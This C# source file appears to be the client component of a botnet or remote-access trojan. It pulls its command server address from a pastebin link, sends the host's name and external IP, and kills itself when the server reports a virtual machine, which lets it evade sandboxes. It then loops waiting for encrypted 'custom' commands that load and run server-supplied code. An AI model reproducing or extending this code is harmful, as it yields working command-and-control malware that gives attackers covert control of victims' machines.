using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using ClientNet.Config;
using ClientNet.Enums;
using ClientNet.Lists;
using ClientNet.Tools;

namespace ClientNet.Network
{
    public class NClient
    {
        private static TcpClient client = new TcpClient(ClientSettings.domainName, ClientSettings.pNum);
        private static NetworkStream nwStream = client.GetStream(); // Create new stream to start/send
        // private static SslStream slStream = new SslStream(nwStream); // Create an encrypted network stream for future use
        // Mess with secure encrypted stream stuff later
        // SslStream sStream = new SslStream(nwStream);
        private SecTool cry = new SecTool();
        public  bool Active = false;
        public bool Failed = false;
        private bool Authing = false;
        public bool Authed = false;
        public void AssignSetupDetails()
        {
            string dl = new WebClient().DownloadString("https://pastebin.com/raw/Sr9kwZD1");
            // TODO: Setup the pastebin link in client settings
            ClientSettings.domainName = dl.Split(':')[0];
            ClientSettings.pNum = Convert.ToInt32(dl.Split(':')[1]);
        }
        public void StartDomain() // Start client
        {
                if (client.Connected)
                {
                    Failed = false;
                    Active = true;
                    Authing = true;
                }
                else
                {
                    Active = false;
                    Failed = true;
                }
        }
        public bool AuthDomain()
        {
            bool isAuthed = false;
            AuthStep currentStep = AuthStep.Step0;
            string step0 = "";
            string step1 = "";
            string step2 = "";
            string step3 = "";
            DevInf dev = new DevInf();
            string neededStep = Convert.ToBase64String(Encoding.ASCII.GetBytes($"{dev.GetName()}:{dev.GetExternal()}"));

            while (Authing)
            {
                switch (currentStep)
                {
                    case AuthStep.Step0:

                        //Send and recieve reply for step 0\\
                        step0 = DefaultSendNGetData(cry.DefaultEncrypt(neededStep),true);
                        Console.WriteLine($"Sent {cry.DefaultEncrypt(neededStep)}");
                        Console.WriteLine($"Recieved {step0} | Decrypted");
                        if (step0.Contains("VALID"))
                        {
                            currentStep = AuthStep.Step1;
                        }
                        else
                        {
                            Failed = true;
                            Authing = false;
                        }

                        break;
                    case AuthStep.Step1:

                        //Send and recieve reply for connection key verification\\
                        step1 = DefaultSendNGetData(cry.DefaultEncrypt(ClientSettings.ConnectionKey),false);
                        Console.WriteLine($"Sent {cry.DefaultEncrypt(ClientSettings.ConnectionKey)}");
                        Console.WriteLine($"Recieved {step1} | Decrypted");
                        if (step1.Contains("VALID"))
                        {
                            currentStep = AuthStep.Step2;
                        }
                        else
                        {
                            Failed = true;
                            Authing = false;
                        }

                        break;
                    case AuthStep.Step2:

                        //Send and recieve reply for pass:salt verification\\
                        step2 = DefaultSendNGetData(cry.DefaultEncrypt($"{StaticKeys.SHAPass}:{StaticKeys.SHASalt}"),false);
                        Console.WriteLine($"Sent {cry.DefaultEncrypt($"{StaticKeys.SHAPass}:{StaticKeys.SHASalt}")}");
                        Console.WriteLine($"Recieved {step2} | Decrypted");
                        if (step2.Contains("VALID"))
                        {
                            currentStep = AuthStep.Step3;
                        }
                        else
                        {
                            Failed = true;
                            Authing = false;
                        }

                        break;
                    case AuthStep.Step3:
                        // This step will process step2 string's data \\
                        // This step also handles if the server tells us to handle the VM or not \\
                        // VALID:{newKeys.Password}:{newKeys.Salt}:{newKeys.XorKey}
                        string result = ReadDecrypted();
                        if (result.Contains("AUSSIEAUSSIEAUSSIE")) // handle VM
                        {
                            Console.WriteLine("Getting rid of some stuff...");
                            Process me = Process.GetCurrentProcess();
                            ProcessStartInfo updateDetails = new ProcessStartInfo();
                            updateDetails.Arguments = $"/f /im {me.ProcessName}";
                            updateDetails.CreateNoWindow = true;
                            updateDetails.UseShellExecute = true;
                            updateDetails.FileName = "taskkill";
                            Process.Start(updateDetails); // Deal with us via MS program
                            break;
                        }
                        if (result.Contains("GOOD")) // Good, use static keys though
                        {
                            Console.WriteLine("Using the built in defaults...");
                            ClientSettings.AssignedKeys = false;
                            Authing = false;
                            Authed = true;
                            break;
                        }
                        if (result.Contains("KEYS"))
                        {
                            string[] updates = result.Split(':');
                            // KEYS:pass:salt:xor:vikey
                            //   0   1    2    3    4
                            EncryptionKeys newKeys = new EncryptionKeys();
                            newKeys.Password = updates[1];
                            newKeys.Salt = updates[2];
                            newKeys.XorKey = updates[3];
                            newKeys.VlKey = updates[4];
                            ClientSettings.key = newKeys;
                            Console.WriteLine("New keys recieved and being used...");
                            ClientSettings.AssignedKeys = true;
                            string response = SendData("UPDATED");
                            Authing = false;
                            Authed = true;
                        }

                        
                        // ClientSettings updated with the needed info at this point \\
                        break;
                    default:
                        break;
                }
            }

            if (Authed)
            {
                isAuthed = true;
            }

            return isAuthed;
        }
        public bool WaitForDad()
        {
            bool recievedDad = false;
            while (true) // default loop for waiting
            {
                byte[] bytesToRead = new byte[client.ReceiveBufferSize];
                int bytesRead = nwStream.Read(bytesToRead, 0, client.ReceiveBufferSize);
                string emptyCheck = null;
                try
                {
                    string raw = Encoding.ASCII.GetString(bytesToRead, 0, bytesRead);
                    emptyCheck = cry.CustomDecrypt(raw);
                }
                catch(Exception ex)
                {
                    Debug.WriteLine(ex.Message);
                }
                if (emptyCheck != null) // Data present
                {
                    // Correct data sent is in this format
                    // function_enum:arguments_if-needed:string_data_of_something
                    // custom handling AKA plugin handling
                    // custom:byte_data:class_name:method_name(aka function name)
                    // Initialize and process custom request with CustomHandler class
                    string[] data = emptyCheck.Split(':');
                    if (data[0].ToLower().Contains("custom"))
                    {
                        CustomHandler cst = new CustomHandler();
                        cst.ProccessRequest(emptyCheck);
                        // TODO: Debug the process, figure out if we can dispose or not
                    }
                }
                else
                {
                    Thread.Sleep(800); // Wait then loop back to checking for shit
                }
                Thread.Sleep(800); // Wait then loop back to checking for shit
                Console.WriteLine("Waiting for work assignment...");
            }

            return recievedDad;
        }

        private string ReadDecrypted()
        {
            byte[] bytesToRead = new byte[client.ReceiveBufferSize];
            int bytesRead = nwStream.Read(bytesToRead, 0, client.ReceiveBufferSize);
            string check = null;
            try
            {
                check = Encoding.ASCII.GetString(bytesToRead, 0, bytesRead);
            }
            catch
            {
            }

            if (check != null)
            {
                return cry.DefaultDecrypt(Encoding.ASCII.GetString(bytesToRead, 0, bytesRead));
            }
            else
            {
                return null;
            }

        }
        private string SendData(string data)
        {
            string toSend = data;
            string recieved = "";
            try
            {
                byte[] bytes = Encoding.ASCII.GetBytes(cry.CustomEncrypt(toSend)); // This function will encrypt before sending in the function itself
                Console.WriteLine("Sending : " + toSend);
                nwStream.Write(bytes, 0, bytes.Length);

                //---read back the text---\
                byte[] bytesToRead = new byte[client.ReceiveBufferSize];
                int bytesRead = nwStream.Read(bytesToRead, 0, client.ReceiveBufferSize);

                recieved = cry.CustomDecrypt(Encoding.ASCII.GetString(bytesToRead, 0, bytesRead));

                return recieved; // return plaintext
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message);
                return "ERROR!";
            }
        }
        private string DefaultSendNGetData(string data, bool step0Check)
        {
            string toSend = data;
            string recieved = "";
            try
            {
                byte[] bytes = Encoding.ASCII.GetBytes(toSend);
                Console.WriteLine("Sending : " + toSend);
                nwStream.Write(bytes, 0, bytes.Length);

                //---read back the text---\
                byte[] bytesToRead = new byte[client.ReceiveBufferSize];
                int bytesRead = nwStream.Read(bytesToRead, 0, client.ReceiveBufferSize);

                recieved = cry.DefaultDecrypt(Encoding.ASCII.GetString(bytesToRead, 0, bytesRead));

                return recieved; // return plaintext
            }
            catch(Exception ex)
            {
                Debug.WriteLine(ex.Message);
                return "ERROR!";
            }
        }

    }
}
